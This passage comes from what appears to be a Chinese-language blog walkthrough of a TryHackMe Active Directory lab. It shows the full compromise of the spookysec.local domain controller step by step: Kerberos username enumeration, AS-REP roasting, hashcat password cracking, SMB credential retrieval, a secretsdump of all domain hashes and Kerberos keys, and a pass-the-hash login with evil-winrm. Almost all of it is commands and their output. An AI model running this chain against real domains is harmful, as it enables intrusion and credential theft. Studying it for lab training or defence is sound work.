05/30/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/05/30 14:24:09 &gt;  Using KDC(s):</span><br><span class="line">2022/05/30 14:24:09 &gt;  	10.10.122.125:88</span><br><span class="line"></span><br><span class="line">2022/05/30 14:24:10 &gt;  [+] VALID USERNAME:	 james@spookysec.local</span><br><span class="line">2022/05/30 14:24:14 &gt;  [+] VALID USERNAME:	 svc-admin@spookysec.local	<span class="comment"># 值得注意的帐户</span></span><br><span class="line">2022/05/30 14:24:20 &gt;  [+] VALID USERNAME:	 James@spookysec.local</span><br><span class="line">2022/05/30 14:24:22 &gt;  [+] VALID USERNAME:	 robin@spookysec.local</span><br><span class="line">2022/05/30 14:24:48 &gt;  [+] VALID USERNAME:	 darkstar@spookysec.local</span><br><span class="line">2022/05/30 14:25:02 &gt;  [+] VALID USERNAME:	 administrator@spookysec.local</span><br><span class="line">2022/05/30 14:25:30 &gt;  [+] VALID USERNAME:	 backup@spookysec.local		<span class="comment"># 值得注意的帐户</span></span><br><span class="line">2022/05/30 14:25:43 &gt;  [+] VALID USERNAME:	 paradox@spookysec.local</span><br><span class="line">2022/05/30 14:27:15 &gt;  [+] VALID USERNAME:	 JAMES@spookysec.local</span><br><span class="line">2022/05/30 14:27:43 &gt;  [+] VALID USERNAME:	 Robin@spookysec.local</span><br><span class="line">2022/05/30 14:30:49 &gt;  [+] VALID USERNAME:	 Administrator@spookysec.local</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-滥用-Kerberos"><a href="#3-滥用-Kerberos" class="headerlink" title="#3 滥用 Kerberos"></a>#3 滥用 Kerberos</h3><p>用户帐户枚举完成后，我们可以尝试使用称为 <strong>AS-REP Roasting 的攻击方法滥用 Kerberos 中的功能。</strong>当用户帐户设置了“不需要预身份验证”权限时，会发生 AS-Re proasting。这意味着该帐户 在请求指定用户帐户的 Kerberos 票证之前不需要提供有效的身份证明<strong>。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetNPUsers spookysec.local/ -dc-ip 10.10.122.125 -usersfile users.txt -format hashcat                       </span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User james doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e</span></span><br><span class="line"><span class="string">[-] User James doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User robin doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User darkstar doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User administrator doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User paradox doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User JAMES doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User Robin doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User Administrator doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>hashcat 破解 Kerberos 5 AS-REP etype 23 hash 得到密码 ：management2005</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">hashcat (v6.2.5) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=====================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 1428/2921 MB (512 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 0 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password/salt length (usually down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better <span class="keyword">for</span> specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$svc</span>-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18<span class="variable">$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e</span>:management2005</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)</span><br><span class="line">Hash.Target......: $krb5asrep$23<span class="variable">$svc</span>-admin@SPOOKYSEC.LOCAL:0d046ef0e8d...b0662e</span><br><span class="line">Time.Started.....: Mon May 30 14:56:22 2022 (13 secs)</span><br><span class="line">Time.Estimated...: Mon May 30 14:56:35 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:   480.2 kH/s (1.28ms) @ Accel:256 Loops:1 Thr:1 Vec:16</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 5837824/14344385 (40.70%)</span><br><span class="line">Rejected.........: 0/5837824 (0.00%)</span><br><span class="line">Restore.Point....: 5836800/14344385 (40.69%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: manaiagal -&gt; man37o9</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 64%</span></span><br><span class="line"></span><br><span class="line">Started: Mon May 30 14:55:48 2022</span><br><span class="line">Stopped: Mon May 30 14:56:36 2022</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>利用账号密码枚举SMB，得到backup用户密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L //10.10.122.125/ -U svc-admin%management2005 </span></span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	backup          Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">	NETLOGON        Disk      Logon server share </span><br><span class="line">	SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.122.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient //10.10.122.125/backup -U svc-admin%management2005 </span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Sun Apr  5 03:08:39 2020</span><br><span class="line">  ..                                  D        0  Sun Apr  5 03:08:39 2020</span><br><span class="line">  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020</span><br><span class="line"></span><br><span class="line">		8247551 blocks of size 4096. 3587256 blocks available</span><br><span class="line">smb: \&gt; mget backup_credentials.txt </span><br><span class="line">Get file backup_credentials.txt? y</span><br><span class="line">getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                    ┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat backup_credentials.txt </span></span><br><span class="line">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw     </span><br><span class="line"></span><br><span class="line">┌─(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># echo &quot;YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw&quot; | base64 -d</span></span><br><span class="line">backup@spookysec.local:backup2517860   </span><br></pre></td></tr></table></figure>



<p>利用backup 用户获取管理员hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># impacket-secretsdump spookysec.local/backup:backup2517860@10.10.122.125</span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::</span><br><span class="line">spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::</span><br><span class="line">spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::</span><br><span class="line">spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::</span><br><span class="line">spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::</span><br><span class="line">spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::</span><br><span class="line">spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::</span><br><span class="line">spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::</span><br><span class="line">spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::</span><br><span class="line">spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::</span><br><span class="line">spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::</span><br><span class="line">spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::</span><br><span class="line">spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::</span><br><span class="line">spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::</span><br><span class="line">spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span><br><span class="line">ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:1583681d41dc2c7ca6aa961cc23d8ec8:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae</span><br><span class="line">Administrator:des-cbc-md5:2079ce0e5df189ad</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902</span><br><span class="line">krbtgt:des-cbc-md5:b94f97e97fabbf5d</span><br><span class="line">spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04</span><br><span class="line">spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233</span><br><span class="line">spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f</span><br><span class="line">spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5</span><br><span class="line">spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425</span><br><span class="line">spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064</span><br><span class="line">spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112</span><br><span class="line">spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6</span><br><span class="line">spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9</span><br><span class="line">spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe</span><br><span class="line">spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510</span><br><span class="line">spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054</span><br><span class="line">spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd</span><br><span class="line">spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e</span><br><span class="line">spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594</span><br><span class="line">spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499</span><br><span class="line">spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be</span><br><span class="line">spookysec.local\darkstar:des-cbc-md5:758af4d061381cea</span><br><span class="line">spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067</span><br><span class="line">spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e</span><br><span class="line">spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a</span><br><span class="line">spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3</span><br><span class="line">spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8</span><br><span class="line">spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64</span><br><span class="line">spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0</span><br><span class="line">spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8</span><br><span class="line">spookysec.local\paradox:des-cbc-md5:83988983f8b34019</span><br><span class="line">spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347</span><br><span class="line">spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa</span><br><span class="line">spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86</span><br><span class="line">spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166</span><br><span class="line">spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c</span><br><span class="line">spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157</span><br><span class="line">spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518</span><br><span class="line">spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff</span><br><span class="line">spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d</span><br><span class="line">spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922</span><br><span class="line">spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197</span><br><span class="line">spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89</span><br><span class="line">spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242</span><br><span class="line">spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68</span><br><span class="line">spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9</span><br><span class="line">ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:14cf17420c1c50fa7c55588b6bb0e857590e45f98cf5923d0e33316ef6589b6e</span><br><span class="line">ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ab962df9e490918881be8544207c4c0c</span><br><span class="line">ATTACKTIVEDIREC$:des-cbc-md5:f719d0c858a73d0e</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="4-Evil-WinRM-登录域控制器"><a href="#4-Evil-WinRM-登录域控制器" class="headerlink" title="#4 Evil-WinRM 登录域控制器"></a>#4 Evil-WinRM 登录域控制器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.10.122.125 -u administrator -H 0e0363213e37b94221497260b0bcb4fc</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br><span class="line">thm-ad\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : eu-west-1.compute.internal</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::f893:989c:cb66:84dc%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.10.122.125</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.0.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.10.0.1</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>


        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>
        <div id="lv-container"></div>
        <div class="giscus"></div>
    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

<script src="/js/index.js"></script>

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>






</html>
